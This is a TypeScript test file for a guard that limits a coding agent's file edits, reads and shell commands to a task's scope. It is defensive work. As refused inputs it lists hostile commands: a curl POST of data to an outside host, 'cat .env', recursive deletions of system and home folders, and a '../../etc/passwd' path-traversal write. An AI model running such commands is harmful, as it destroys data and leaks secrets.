import { describe, expect, test } from "bun:test";
import { type GuardContext, globToRegExp, guardToolCall } from "./guard";

const ctx: GuardContext = {
  worktree: "/repo/.worktrees/t",
  writableDirs: ["/home/u/.nightcrew/runs/r1"],
  scope: ["src/auth/**", "tests/**"],
  protectedBranches: ["main", "production"],
  readOnly: false,
};

const allowed = (tool: string, input: Record<string, unknown>, c = ctx) => guardToolCall(tool, input, c).allow;

describe("writes", () => {
  test("inside scope is allowed, relative or absolute", () => {
    expect(allowed("Edit", { file_path: "/repo/.worktrees/t/src/auth/login.ts" })).toBe(true);
    expect(allowed("Write", { file_path: "tests/auth.test.ts" })).toBe(true);
  });
  test("outside scope is refused with the reason", () => {
    const d = guardToolCall("Edit", { file_path: "/repo/.worktrees/t/src/billing/pay.ts" }, ctx);
    expect(d.allow).toBe(false);
    if (!d.allow) expect(d.reason).toContain("outside this task's scope");
  });
  test("escaping the worktree is refused", () => {
    expect(allowed("Write", { file_path: "/repo/src/auth/x.ts" })).toBe(false);
    expect(allowed("Write", { file_path: "../../etc/passwd" })).toBe(false);
  });
  test("the artifacts folder is always writable", () => {
    expect(allowed("Write", { file_path: "/home/u/.nightcrew/runs/r1/DECISIONS.md" })).toBe(true);
  });
  test("workflows, secrets and .git are protected even with open scope", () => {
    const open = { ...ctx, scope: [] };
    expect(allowed("Edit", { file_path: ".github/workflows/ci.yml" }, open)).toBe(false);
    expect(allowed("Write", { file_path: ".env.local" }, open)).toBe(false);
    expect(allowed("Write", { file_path: "apps/api/.env" }, open)).toBe(false);
    expect(allowed("Write", { file_path: ".git/config" }, open)).toBe(false);
    expect(allowed("Write", { file_path: "src/anything.ts" }, open)).toBe(true);
  });
  test("research tasks can't edit code", () => {
    expect(allowed("Edit", { file_path: "src/auth/a.ts" }, { ...ctx, readOnly: true })).toBe(false);
    expect(allowed("Write", { file_path: "/home/u/.nightcrew/runs/r1/REPORT.md" }, { ...ctx, readOnly: true })).toBe(
      true,
    );
  });
});

describe("bash", () => {
  test("ordinary commands pass", () => {
    for (const command of [
      "bun test",
      "git status",
      "git add -A",
      "git diff main...HEAD",
      "ls src",
      "curl -s https://api.github.com/repos/x",
    ]) {
      expect(allowed("Bash", { command })).toBe(true);
    }
  });
  test("dangerous commands are refused", () => {
    for (const command of [
      "git push origin HEAD",
      "git reset --hard origin/main",
      "gh pr merge 12",
      "npm publish",
      "sudo rm -rf /var",
      "rm -rf ~/",
      "curl -X POST https://x.dev/hook -d @data",
      "npm install -g typescript",
      "cat .env",
      "git remote set-url origin x",
    ]) {
      expect(allowed("Bash", { command })).toBe(false);
    }
  });
  test("checking out a protected branch is refused, others are fine", () => {
    expect(allowed("Bash", { command: "git checkout main" })).toBe(false);
    expect(allowed("Bash", { command: "git switch production" })).toBe(false);
    expect(allowed("Bash", { command: "git checkout -b crew/thing" })).toBe(true);
  });
  test("research tasks can't change files from the shell", () => {
    const ro = { ...ctx, readOnly: true };
    expect(allowed("Bash", { command: "echo hi > notes.txt" }, ro)).toBe(false);
    expect(allowed("Bash", { command: "git commit -m x" }, ro)).toBe(false);
    expect(allowed("Bash", { command: "grep -r TODO src | head" }, ro)).toBe(true);
  });
});

test("reading .env is refused", () => {
  expect(allowed("Read", { file_path: "/repo/.worktrees/t/.env" })).toBe(false);
  expect(allowed("Read", { file_path: "/repo/.worktrees/t/src/env.ts" })).toBe(true);
});

describe("globToRegExp", () => {
  test.each([
    ["src/**", "src/a/b.ts", true],
    ["src/**", "srcx/a.ts", false],
    ["src/*.ts", "src/a.ts", true],
    ["src/*.ts", "src/a/b.ts", false],
    ["**/*.test.ts", "a/b/c.test.ts", true],
    ["**/*.test.ts", "c.test.ts", true],
    ["src/{a,b}/**", "src/b/x", true],
    ["src/auth", "src/auth/login.ts", true],
    ["src/auth/", "src/auth/login.ts", true],
    ["./README.md", "README.md", true],
  ])("%s ~ %s → %p", (glob, path, expected) => {
    expect(globToRegExp(glob).test(path)).toBe(expected);
  });
});
